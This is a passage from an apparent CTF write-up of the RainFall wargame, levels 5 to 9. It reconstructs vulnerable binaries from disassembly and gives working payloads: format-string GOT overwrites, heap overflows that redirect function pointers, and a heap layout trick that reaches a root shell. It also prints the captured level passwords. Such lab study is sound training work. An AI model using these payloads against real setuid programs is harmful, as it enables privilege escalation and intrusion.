as we can see, it contains all the jump instruction for our standard library calls. In most cases, the PLT of programs are **read only**, which can be checked like so 
```
level5@RainFall:~$ objdump -h ./level5 | grep -A1 "\ .plt\ "
 11 .plt          00000080  08048370  08048370  00000370  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
level5@RainFall:~$
```

However, upon closer inspection, the address that the PLT entries jump to isnt to the function instruction themselves, but **rather pointers to the function instructions** (notice how they derefrences the addresses when jumping). These addresses exist in another section, called the **global offset table (GOT)**, which is writable. These addresses can be directly obtained by displaying the **dynamic relocation entries** for the binary by using objdump. `objdump -R ./level5`

```
./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

This shows that the address `0x08049838` will be onw one getting called. We can overwrite the value of this address using printf to the instruction for the `o()` function, which is `0x080484a4` based on the disassembly objdump.

Now we know where to write to and what to write, its time to go over the procesures of
1. Generate mapping of address to determine how many times we want to write
2. Finding the format string (first arg) value location
3. Calculate number of bytes written and generate payload

The mapping/segmentation `080484a4` should look like this
```
0x08049838 - 0x4a4
0x08049839 - 0x8048
```

with the input `BBBB%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x`, I got this output `BBBB200 b7fd1ac0 b7ff37d0 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a`, which indicates that the first args value is at the foruth call of %x.

Using the following input
`python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%1180x' + '%4\$n' + '%31652x' + '%5\$n'" > /tmp/level5`, I did not get the results I want. Because **by default, %n writes 4 bytes, which causes overlaps on smaller values**
![image](https://hackmd.io/_uploads/S1aqYpYSa.png)

So, we need to find a way to make it so that the values dont overlap each other. There is a way to make **%n write as short, using %hhn for 1 byte, and %hn for 2 bytes**.
The new mapping/segmentation `080484a4` should look like this
```
0x08049839 - 0x84
0x08049838 - 0xa4
0x0804983a - 0x804
```
As well as the new input
`python -c "print '\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] +  '\x08\x04\x98\x3a'[::-1] + '%120x' + '%4\$hhn' + '%32x' + '%5\$hhn' + '%1888x' + '%6\$n' " > /tmp/level5`

![image](https://hackmd.io/_uploads/SJWcjTtS6.png)

And viola, we got ourselves the overwrite we want. Now to open stdin to the program..

![image](https://hackmd.io/_uploads/ryJasaKBT.png)

The password is 
`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

## level6 
Below is the objdump for level6
```
08048454 <n>:
 8048454:       55                      push   ebp
 8048455:       89 e5                   mov    ebp,esp
 8048457:       83 ec 18                sub    esp,0x18
 804845a:       c7 04 24 b0 85 04 08    mov    DWORD PTR [esp],0x80485b0
 8048461:       e8 0a ff ff ff          call   8048370 <system@plt>
 8048466:       c9                      leave
 8048467:       c3                      ret

08048468 <m>:
 8048468:       55                      push   ebp
 8048469:       89 e5                   mov    ebp,esp
 804846b:       83 ec 18                sub    esp,0x18
 804846e:       c7 04 24 d1 85 04 08    mov    DWORD PTR [esp],0x80485d1
 8048475:       e8 e6 fe ff ff          call   8048360 <puts@plt>
 804847a:       c9                      leave
 804847b:       c3                      ret

0804847c <main>:
 804847c:       55                      push   ebp
 804847d:       89 e5                   mov    ebp,esp
 804847f:       83 e4 f0                and    esp,0xfffffff0
 8048482:       83 ec 20                sub    esp,0x20
 8048485:       c7 04 24 40 00 00 00    mov    DWORD PTR [esp],0x40
 804848c:       e8 bf fe ff ff          call   8048350 <malloc@plt>
 8048491:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 8048495:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
 80484a1:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 80484a5:       ba 68 84 04 08          mov    edx,0x8048468
 80484aa:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ae:       89 10                   mov    DWORD PTR [eax],edx
 80484b0:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484b3:       83 c0 04                add    eax,0x4
 80484b6:       8b 00                   mov    eax,DWORD PTR [eax]
 80484b8:       89 c2                   mov    edx,eax
 80484ba:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484be:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80484c2:       89 04 24                mov    DWORD PTR [esp],eax
 80484c5:       e8 76 fe ff ff          call   8048340 <strcpy@plt>
 80484ca:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ce:       8b 00                   mov    eax,DWORD PTR [eax]
 80484d0:       ff d0                   call   eax
 80484d2:       c9                      leave
 80484d3:       c3                      ret
 80484d4:       90                      nop
 80484d5:       90                      nop
 80484d6:       90                      nop
 80484d7:       90                      nop
 80484d8:       90                      nop
 80484d9:       90                      nop
 80484da:       90                      nop
 80484db:       90                      nop
 80484dc:       90                      nop
 80484dd:       90                      nop
 80484de:       90                      nop
 80484df:       90                      nop
 ```
Looking at the object jump, the code looks something like this
```clike=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// 08048454
void    n()
{
	system("/bin/cat /home/user/level7/.pass");
}

// 08048468
void    m()
{
	puts("Nope");
}

int main()
{
    // 8048482
    char *ptr1;
    void* fn_ptr;
    
    // 804848c
    ptr1 = malloc(64);
    
    // 804849c
    fn_ptr = malloc(4);
    
    // 80484a5 - 80484ae
    *fn_ptr = m;
    
    // 80484ba - 80484c5
    strcpy(ptr1, argv[1]);
    
    // 80484ce - 80484d0
    (*fn_ptr)();
}
```
Looks like we have a heap overflow vulnerability here. Heap overflow mechanics work silimar to stack overflows, except that they are **iverted and have space between elements**. The procesure will be similar, we will execute the following steps:
1. Find how many characters we need to input to overwrite fn_ptr
2. Once offset is found, append the function address of n()

For the first step, I generated my input using the script `python -c "print 'B' * 73"`, which goves me the offset. I also learnt to do direct derefrencing using ` x/10x  *(int *)($esp+0x18)` to validate results
![image](https://hackmd.io/_uploads/H10TMUiHa.png)

The offset is 72, now I will append the address in my input to overwrite the function pointer with value `08048454`. `python -c "print 'B' * 72 + '\x08\x04\x84\x54'[::-1]"`. The password is `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

```
level6@RainFall:~$ ./level6 `python -c "print 'B' * 72 + '\x08\x04\x84\x54'[::-1]"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$
```

## level7 
below is the objdump for level7 `0x80486e0, 0x8049960`
```
080484f4 <m>:
 80484f4:       55                      push   ebp
 80484f5:       89 e5                   mov    ebp,esp
 80484f7:       83 ec 18                sub    esp,0x18
 80484fa:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 8048501:       e8 ca fe ff ff          call   80483d0 <time@plt>
 8048506:       ba e0 86 04 08          mov    edx,0x80486e0
 804850b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804850f:       c7 44 24 04 60 99 04    mov    DWORD PTR [esp+0x4],0x8049960
 8048516:       08
 8048517:       89 14 24                mov    DWORD PTR [esp],edx
 804851a:       e8 91 fe ff ff          call   80483b0 <printf@plt>
 804851f:       c9                      leave
 8048520:       c3                      ret

08048521 <main>:
 8048521:       55                      push   ebp
 8048522:       89 e5                   mov    ebp,esp
 8048524:       83 e4 f0                and    esp,0xfffffff0
 8048527:       83 ec 20                sub    esp,0x20
 804852a:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
 8048531:       e8 ba fe ff ff          call   80483f0 <malloc@plt>
 8048536:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 804853a:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 804853e:       c7 00 01 00 00 00       mov    DWORD PTR [eax],0x1
 8048544:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
 804854b:       e8 a0 fe ff ff          call   80483f0 <malloc@plt>
 8048550:       89 c2                   mov    edx,eax
 8048552:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048556:       89 50 04                mov    DWORD PTR [eax+0x4],edx
 8048559:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
 8048560:       e8 8b fe ff ff          call   80483f0 <malloc@plt>
 8048565:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 8048569:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 804856d:       c7 00 02 00 00 00       mov    DWORD PTR [eax],0x2
 8048573:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
 804857a:       e8 71 fe ff ff          call   80483f0 <malloc@plt>
 804857f:       89 c2                   mov    edx,eax
 8048581:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 8048585:       89 50 04                mov    DWORD PTR [eax+0x4],edx
 8048588:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804858b:       83 c0 04                add    eax,0x4
 804858e:       8b 00                   mov    eax,DWORD PTR [eax]
 8048590:       89 c2                   mov    edx,eax
 8048592:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048596:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]
 8048599:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804859d:       89 04 24                mov    DWORD PTR [esp],eax
 80485a0:       e8 3b fe ff ff          call   80483e0 <strcpy@plt>
 80485a5:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80485a8:       83 c0 08                add    eax,0x8
 80485ab:       8b 00                   mov    eax,DWORD PTR [eax]
 80485ad:       89 c2                   mov    edx,eax
 80485af:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80485b3:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]
 80485b6:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80485ba:       89 04 24                mov    DWORD PTR [esp],eax
 80485bd:       e8 1e fe ff ff          call   80483e0 <strcpy@plt>
 80485c2:       ba e9 86 04 08          mov    edx,0x80486e9
 80485c7:       b8 eb 86 04 08          mov    eax,0x80486eb
 80485cc:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80485d0:       89 04 24                mov    DWORD PTR [esp],eax
 80485d3:       e8 58 fe ff ff          call   8048430 <fopen@plt>
 80485d8:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80485dc:       c7 44 24 04 44 00 00    mov    DWORD PTR [esp+0x4],0x44
 80485e3:       00
 80485e4:       c7 04 24 60 99 04 08    mov    DWORD PTR [esp],0x8049960
 80485eb:       e8 d0 fd ff ff          call   80483c0 <fgets@plt>
 80485f0:       c7 04 24 03 87 04 08    mov    DWORD PTR [esp],0x8048703
 80485f7:       e8 04 fe ff ff          call   8048400 <puts@plt>
 80485fc:       b8 00 00 00 00          mov    eax,0x0
 8048601:       c9                      leave
 8048602:       c3                      ret
 8048603:       90                      nop
 8048604:       90                      nop
 8048605:       90                      nop
 8048606:       90                      nop
 8048607:       90                      nop
 8048608:       90                      nop
 8048609:       90                      nop
 804860a:       90                      nop
 804860b:       90                      nop
 804860c:       90                      nop
 804860d:       90                      nop
 804860e:       90                      nop
 804860f:       90                      nop
 ```
After looking at the objdump and analyzing the data values. the source code can be deduced as 
```clike=
#include <time.h>
#include <stdio.h>
    
// 080484f4
void m()
{
    int num_of_sec = time(0);
    printf("%s - %d\n", g_fgets_buf, num_of_sec);
}
// 08048521
void main()
{
    // 8048527
    void *ptr1;
    void *ptr2;
    FILE *file;
    
    // 804854b
    ptr1 = malloc(8);
    ptr1[0] = 0x1;
    
    // 804857a
    ptr1[1] = malloc(8);
    
    // 8048560
    ptr2 = malloc(8);
    ptr2[0] = 0x2;
    
    // 804857a
    ptr2[1] = malloc(8);
    
    // 80485a0
    strcpy(ptr1[1], argv[1]);
    
    // 80485bd
    strcpy(ptr2[1], argv[2]);
    
    file = fopen("/home/user/level8/.pass","r");
    fgets(pass, 68, fs);
    puts("~~");
    return 0;
}
```
Since the heap space is close and buffer grows to the GOT, I though it was a good idea to overwrite one of the mallocs to overwrit puts address, however, doing so might corrupt `fgets` (which I havent tested) since fgets is higer than puts in memory

```
./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen

```
right now, the info that we have is, we want to overwrite `0x08049928` which is the address to the puts function, to the address of the m function `080484f4` .

To inspect the memory layout of the malloced heap, I ran with the arguments `AAAAAAAA` and `BBBBBBBB` to pre fill the buffers
Here is the layout for the first strcpy

![image](https://hackmd.io/_uploads/Sy1fc6hrT.png)

Here is the layout for the second one

![image](https://hackmd.io/_uploads/Sk5B962Bp.png)

I have ran this many times, and turns out the same. The layout looks kinds of like this

![image](https://hackmd.io/_uploads/BJxCpahrT.png)

With this information, now we know that for the first strcpy, we will overwrite the value of ptr_2_ptr2[1] via buffer overflow with the GOT of 20 bytes.

The second strcpy will then write the address of the m function with an address in the GOT, which is at ptr_2_ptr2[1]

I ran the program like this and It game me the password `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
```
./level7 `python -c print"'B' * 20 + '\x08\x04\x99\x28'[::-1]"`  ` python -c print"'\x08\x04\x84\xf4'[::-1]"`
```

![image](https://hackmd.io/_uploads/H1X81A3Bp.png)

## level8
Below is an objdump of the program

```
08048564 <main>:
 8048564:       55                      push   ebp
 8048565:       89 e5                   mov    ebp,esp
 8048567:       57                      push   edi
 8048568:       56                      push   esi
 8048569:       83 e4 f0                and    esp,0xfffffff0
 804856c:       81 ec a0 00 00 00       sub    esp,0xa0
 8048572:       eb 01                   jmp    8048575 <main+0x11>
 8048574:       90                      nop
 8048575:       8b 0d b0 9a 04 08       mov    ecx,DWORD PTR ds:0x8049ab0
 804857b:       8b 15 ac 9a 04 08       mov    edx,DWORD PTR ds:0x8049aac
 8048581:       b8 10 88 04 08          mov    eax,0x8048810
 8048586:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
 804858a:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804858e:       89 04 24                mov    DWORD PTR [esp],eax
 8048591:       e8 7a fe ff ff          call   8048410 <printf@plt>
 8048596:       a1 80 9a 04 08          mov    eax,ds:0x8049a80
 804859b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804859f:       c7 44 24 04 80 00 00    mov    DWORD PTR [esp+0x4],0x80
 80485a6:       00
 80485a7:       8d 44 24 20             lea    eax,[esp+0x20]
 80485ab:       89 04 24                mov    DWORD PTR [esp],eax
 80485ae:       e8 8d fe ff ff          call   8048440 <fgets@plt>
 80485b3:       85 c0                   test   eax,eax
 80485b5:       0f 84 71 01 00 00       je     804872c <main+0x1c8>
 80485bb:       8d 44 24 20             lea    eax,[esp+0x20]
 80485bf:       89 c2                   mov    edx,eax
 80485c1:       b8 19 88 04 08          mov    eax,0x8048819
 80485c6:       b9 05 00 00 00          mov    ecx,0x5
 80485cb:       89 d6                   mov    esi,edx
 80485cd:       89 c7                   mov    edi,eax
 80485cf:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80485d1:       0f 97 c2                seta   dl
 80485d4:       0f 92 c0                setb   al
 80485d7:       89 d1                   mov    ecx,edx
 80485d9:       28 c1                   sub    cl,al
 80485db:       89 c8                   mov    eax,ecx
 80485dd:       0f be c0                movsx  eax,al
 80485e0:       85 c0                   test   eax,eax
 80485e2:       75 5e                   jne    8048642 <main+0xde>
 80485e4:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 80485eb:       e8 80 fe ff ff          call   8048470 <malloc@plt>
 80485f0:       a3 ac 9a 04 08          mov    ds:0x8049aac,eax
 80485f5:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 80485fa:       c7 00 00 00 00 00       mov    DWORD PTR [eax],0x0
 8048600:       8d 44 24 20             lea    eax,[esp+0x20]
 8048604:       83 c0 05                add    eax,0x5
 8048607:       c7 44 24 1c ff ff ff    mov    DWORD PTR [esp+0x1c],0xffffffff
 804860e:       ff
 804860f:       89 c2                   mov    edx,eax
 8048611:       b8 00 00 00 00          mov    eax,0x0
 8048616:       8b 4c 24 1c             mov    ecx,DWORD PTR [esp+0x1c]
 804861a:       89 d7                   mov    edi,edx
 804861c:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804861e:       89 c8                   mov    eax,ecx
 8048620:       f7 d0                   not    eax
 8048622:       83 e8 01                sub    eax,0x1
 8048625:       83 f8 1e                cmp    eax,0x1e
 8048628:       77 18                   ja     8048642 <main+0xde>
 804862a:       8d 44 24 20             lea    eax,[esp+0x20]
 804862e:       8d 50 05                lea    edx,[eax+0x5]
 8048631:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 8048636:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804863a:       89 04 24                mov    DWORD PTR [esp],eax
 804863d:       e8 1e fe ff ff          call   8048460 <strcpy@plt>
 8048642:       8d 44 24 20             lea    eax,[esp+0x20]
 8048646:       89 c2                   mov    edx,eax
 8048648:       b8 1f 88 04 08          mov    eax,0x804881f
 804864d:       b9 05 00 00 00          mov    ecx,0x5
 8048652:       89 d6                   mov    esi,edx
 8048654:       89 c7                   mov    edi,eax
 8048656:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 8048658:       0f 97 c2                seta   dl
 804865b:       0f 92 c0                setb   al
 804865e:       89 d1                   mov    ecx,edx
 8048660:       28 c1                   sub    cl,al
 8048662:       89 c8                   mov    eax,ecx
 8048664:       0f be c0                movsx  eax,al
 8048667:       85 c0                   test   eax,eax
 8048669:       75 0d                   jne    8048678 <main+0x114>
 804866b:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 8048670:       89 04 24                mov    DWORD PTR [esp],eax
 8048673:       e8 a8 fd ff ff          call   8048420 <free@plt>
 8048678:       8d 44 24 20             lea    eax,[esp+0x20]
 804867c:       89 c2                   mov    edx,eax
 804867e:       b8 25 88 04 08          mov    eax,0x8048825
 8048683:       b9 06 00 00 00          mov    ecx,0x6
 8048688:       89 d6                   mov    esi,edx
 804868a:       89 c7                   mov    edi,eax
 804868c:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 804868e:       0f 97 c2                seta   dl
 8048691:       0f 92 c0                setb   al
 8048694:       89 d1                   mov    ecx,edx
 8048696:       28 c1                   sub    cl,al
 8048698:       89 c8                   mov    eax,ecx
 804869a:       0f be c0                movsx  eax,al
 804869d:       85 c0                   test   eax,eax
 804869f:       75 14                   jne    80486b5 <main+0x151>
 80486a1:       8d 44 24 20             lea    eax,[esp+0x20]
 80486a5:       83 c0 07                add    eax,0x7
 80486a8:       89 04 24                mov    DWORD PTR [esp],eax
 80486ab:       e8 80 fd ff ff          call   8048430 <strdup@plt>
 80486b0:       a3 b0 9a 04 08          mov    ds:0x8049ab0,eax
 80486b5:       8d 44 24 20             lea    eax,[esp+0x20]
 80486b9:       89 c2                   mov    edx,eax
 80486bb:       b8 2d 88 04 08          mov    eax,0x804882d
 80486c0:       b9 05 00 00 00          mov    ecx,0x5
 80486c5:       89 d6                   mov    esi,edx
 80486c7:       89 c7                   mov    edi,eax
 80486c9:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80486cb:       0f 97 c2                seta   dl
 80486ce:       0f 92 c0                setb   al
 80486d1:       89 d1                   mov    ecx,edx
 80486d3:       28 c1                   sub    cl,al
 80486d5:       89 c8                   mov    eax,ecx
 80486d7:       0f be c0                movsx  eax,al
 80486da:       85 c0                   test   eax,eax
 80486dc:       0f 85 92 fe ff ff       jne    8048574 <main+0x10>
 80486e2:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 80486e7:       8b 40 20                mov    eax,DWORD PTR [eax+0x20]
 80486ea:       85 c0                   test   eax,eax
 80486ec:       74 11                   je     80486ff <main+0x19b>
 80486ee:       c7 04 24 33 88 04 08    mov    DWORD PTR [esp],0x8048833
 80486f5:       e8 86 fd ff ff          call   8048480 <system@plt>
 80486fa:       e9 75 fe ff ff          jmp    8048574 <main+0x10>
 80486ff:       a1 a0 9a 04 08          mov    eax,ds:0x8049aa0
 8048704:       89 c2                   mov    edx,eax
 8048706:       b8 3b 88 04 08          mov    eax,0x804883b
 804870b:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 804870f:       c7 44 24 08 0a 00 00    mov    DWORD PTR [esp+0x8],0xa
 8048716:       00
 8048717:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 804871e:       00
 804871f:       89 04 24                mov    DWORD PTR [esp],eax
 8048722:       e8 29 fd ff ff          call   8048450 <fwrite@plt>
 8048727:       e9 48 fe ff ff          jmp    8048574 <main+0x10>
 804872c:       90                      nop
 804872d:       b8 00 00 00 00          mov    eax,0x0
 8048732:       8d 65 f8                lea    esp,[ebp-0x8]
 8048735:       5e                      pop    esi
 8048736:       5f                      pop    edi
 8048737:       5d                      pop    ebp
 8048738:       c3                      ret
 8048739:       90                      nop
 804873a:       90                      nop
 804873b:       90                      nop
 804873c:       90                      nop
 804873d:       90                      nop
 804873e:       90                      nop
 804873f:       90                      nop
 ```

I learnt a new instruction `repnz scas al,BYTE PTR es:[edi]`. This instruction is a combination of repnz and scas prefixes. The repnz will repeat an instruction, on our case is scas, until a zero value is found. the scan instruction scans a string and it comparaes the value in al with the value in ES:[EDI] and updates the flags according to results.

This is mainly used to record the ecx value used by repnz, to get the string length.

The pseudo-code looks like this
```clike=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


char	*auth = NULL;
char	*service = NULL;

int    main()
{
    char    fgets_buf[129];

    while (1)
    {
        // 8048591
        printf("%p, %p \n", auth, service);	

        // 80485ae
        if (fgets(fgets_buf, 128, stdin) == NULL)
            break;

        // 80485cf        
        if (strncmp(fgets_buf, "auth ", 5) == 0)
        {
            // 80485eb
            auth = malloc(4);
            
            // 80485fa
            auth[0] = '\0';
            
            // 804861c
            if (strlen(fgets_buf - 5 - 1) > 30)
                continue;
            
            // 804863d
            strcpy(auth, fgets_buf + 5);
        }

        // 8048656
        if (strncmp(fgets_buf, "reset", 5) == 0)
            free(auth); // 8048673

        // 804868c
        if (strncmp(fgets_buf, "service", 6) == 0)
            service = strdup(fgets_buf + 7); // 80486ab

        // 80486c9
        if (strncmp(fgets_buf, "login", 5) == 0)
        {
            // 80486e7
            if (auth[32] != '\0')
                system("/bin/sh"); // 80486f5
            else
                 fwrite("Password:\n", 1, 10, stdout); // 8048722
        }
    }
    return 0;
}
```
Looks like there isnt any obvious vulns right off the bat, however I do see we need to somehow overwrite the boundaries of auth, which is possible, because `80485eb` only malloced 4 bytes for the pointer but the strcpy can go up to 32 bytes. The only thing I see is possible is to somehow make the `strdup` from service to write memory next to auths 4 byte size.

Here are the observations I obtained from GDB. As we can see, from the first iteration, the layout of the variables in the data section and they are located 4 bytes from each other by default.
![image](https://hackmd.io/_uploads/rkfGQr1Ua.png)

After the first auth input, the `auth` variable now stores an address, `0x0804a008`.
![image](https://hackmd.io/_uploads/BJd-NS1I6.png)

As we can see, the address should yield our input, `BBCC`
![image](https://hackmd.io/_uploads/HysGIByUa.png)

At our second iteration, our service command starts filling up the space below
![image](https://hackmd.io/_uploads/SJcvLByLp.png)

As we can see, we already classify for the login shell, when our input for service is 121 characters long
![image](https://hackmd.io/_uploads/SJ_JwSJLp.png)

I tried going over 127 charactersm but by right it shouldnt overwrite auth because the malloced space is 4.
![image](https://hackmd.io/_uploads/S10qvByUT.png)

The input I used for this is 
```
auth BBCC
service ADASDASDASDAdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

The programming mistake here is that the malloc is too small, we should malloc at least 32 for auth instead if we want to read it later on. The password is like so `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
![image](https://hackmd.io/_uploads/rk2JuByUp.png)

## level9
The obdump of level9 is like so
```
080485f4 <main>:
 80485f4:       55                      push   ebp
 80485f5:       89 e5                   mov    ebp,esp
 80485f7:       53                      push   ebx
 80485f8:       83 e4 f0                and    esp,0xfffffff0
 80485fb:       83 ec 20                sub    esp,0x20
 80485fe:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
 8048602:       7f 0c                   jg     8048610 <main+0x1c>
 8048604:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804860b:       e8 e0 fe ff ff          call   80484f0 <_exit@plt>
 8048610:       c7 04 24 6c 00 00 00    mov    DWORD PTR [esp],0x6c
 8048617:       e8 14 ff ff ff          call   8048530 <_Znwj@plt>
 804861c:       89 c3                   mov    ebx,eax
 804861e:       c7 44 24 04 05 00 00    mov    DWORD PTR [esp+0x4],0x5
 8048625:       00
 8048626:       89 1c 24                mov    DWORD PTR [esp],ebx
 8048629:       e8 c8 00 00 00          call   80486f6 <_ZN1NC1Ei>
 804862e:       89 5c 24 1c             mov    DWORD PTR [esp+0x1c],ebx
 8048632:       c7 04 24 6c 00 00 00    mov    DWORD PTR [esp],0x6c
 8048639:       e8 f2 fe ff ff          call   8048530 <_Znwj@plt>
 804863e:       89 c3                   mov    ebx,eax
 8048640:       c7 44 24 04 06 00 00    mov    DWORD PTR [esp+0x4],0x6
 8048647:       00
 8048648:       89 1c 24                mov    DWORD PTR [esp],ebx
 804864b:       e8 a6 00 00 00          call   80486f6 <_ZN1NC1Ei>
 8048650:       89 5c 24 18             mov    DWORD PTR [esp+0x18],ebx
 8048654:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048658:       89 44 24 14             mov    DWORD PTR [esp+0x14],eax
 804865c:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 8048660:       89 44 24 10             mov    DWORD PTR [esp+0x10],eax
 8048664:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048667:       83 c0 04                add    eax,0x4
 804866a:       8b 00                   mov    eax,DWORD PTR [eax]
 804866c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048670:       8b 44 24 14             mov    eax,DWORD PTR [esp+0x14]
 8048674:       89 04 24                mov    DWORD PTR [esp],eax
 8048677:       e8 92 00 00 00          call   804870e <_ZN1N13setAnnotationEPc>
 804867c:       8b 44 24 10             mov    eax,DWORD PTR [esp+0x10]
 8048680:       8b 00                   mov    eax,DWORD PTR [eax]
 8048682:       8b 10                   mov    edx,DWORD PTR [eax]
 8048684:       8b 44 24 14             mov    eax,DWORD PTR [esp+0x14]
 8048688:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804868c:       8b 44 24 10             mov    eax,DWORD PTR [esp+0x10]
 8048690:       89 04 24                mov    DWORD PTR [esp],eax
 8048693:       ff d2                   call   edx
 8048695:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 8048698:       c9                      leave
 8048699:       c3                      ret

0804869a <_Z41__static_initialization_and_destruction_0ii>:
 804869a:       55                      push   ebp
 804869b:       89 e5                   mov    ebp,esp
 804869d:       83 ec 18                sub    esp,0x18
 80486a0:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
 80486a4:       75 32                   jne    80486d8 <_Z41__static_initialization_and_destruction_0ii+0x3e>
 80486a6:       81 7d 0c ff ff 00 00    cmp    DWORD PTR [ebp+0xc],0xffff
 80486ad:       75 29                   jne    80486d8 <_Z41__static_initialization_and_destruction_0ii+0x3e>
 80486af:       c7 04 24 b4 9b 04 08    mov    DWORD PTR [esp],0x8049bb4
 80486b6:       e8 15 fe ff ff          call   80484d0 <_ZNSt8ios_base4InitC1Ev@plt>
 80486bb:       b8 00 85 04 08          mov    eax,0x8048500
 80486c0:       c7 44 24 08 78 9b 04    mov    DWORD PTR [esp+0x8],0x8049b78
 80486c7:       08
 80486c8:       c7 44 24 04 b4 9b 04    mov    DWORD PTR [esp+0x4],0x8049bb4
 80486cf:       08
 80486d0:       89 04 24                mov    DWORD PTR [esp],eax
 80486d3:       e8 d8 fd ff ff          call   80484b0 <__cxa_atexit@plt>
 80486d8:       c9                      leave
 80486d9:       c3                      ret

080486da <_GLOBAL__sub_I_main>:
 80486da:       55                      push   ebp
 80486db:       89 e5                   mov    ebp,esp
 80486dd:       83 ec 18                sub    esp,0x18
 80486e0:       c7 44 24 04 ff ff 00    mov    DWORD PTR [esp+0x4],0xffff
 80486e7:       00
 80486e8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80486ef:       e8 a6 ff ff ff          call   804869a <_Z41__static_initialization_and_destruction_0ii>
 80486f4:       c9                      leave
 80486f5:       c3                      ret

080486f6 <_ZN1NC1Ei>:
 80486f6:       55                      push   ebp
